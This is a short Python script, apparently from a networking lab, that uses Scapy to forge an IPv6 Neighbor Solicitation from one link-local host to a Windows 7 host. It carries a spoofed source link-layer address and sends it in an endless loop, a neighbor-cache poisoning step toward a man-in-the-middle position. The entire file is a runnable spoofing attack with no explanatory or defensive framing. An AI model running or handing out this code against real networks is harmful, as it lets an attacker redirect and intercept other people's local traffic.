from scapy.all import *

#sending from ubunto to windows7 while win7 pinging ubunto with spoofed man
a=IPv6(src='fe80::215:5dff:fe00:1800', dst='fe80::743b:c3a3:9071:7587')
b=ICMPv6ND_NS(tgt='fe80::743b:c3a3:9071:7587')
c=ICMPv6NDOptSrcLLAddr(lladdr='00:15:5d:00:1d:00')


pkt=a/b/c

while True:
	send(pkt)